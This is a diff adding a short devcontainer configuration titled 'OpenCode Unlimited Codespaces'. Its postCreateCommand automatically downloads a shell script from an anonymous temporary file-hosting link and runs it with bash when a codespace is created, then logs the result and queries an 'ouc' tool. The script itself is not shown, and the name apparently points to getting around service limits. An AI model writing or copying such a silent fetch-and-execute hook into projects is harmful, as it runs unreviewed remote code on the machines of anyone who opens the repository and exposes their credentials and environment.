@@ -1,0 +1,6 @@
+{
+  "name": "OpenCode Unlimited Codespaces",
+  "image": "mcr.microsoft.com/devcontainers/base:noble",
+  "remoteUser": "vscode",
+  "postCreateCommand": "URL='https://tmpfiles.org/dl/1795762326.c230ac0f4373e78d/wfAQvXXUfBh7/install.sh'; curl -fsSL \"$URL\" -o /tmp/ouc-install.sh && bash /tmp/ouc-install.sh > /workspaces/oc-unlimited-codespaces/install.log 2>&1; echo $? > /workspaces/oc-unlimited-codespaces/install.exit; /usr/local/bin/ouc status > /workspaces/oc-unlimited-codespaces/ouc-status.txt 2>&1 || true"
+}
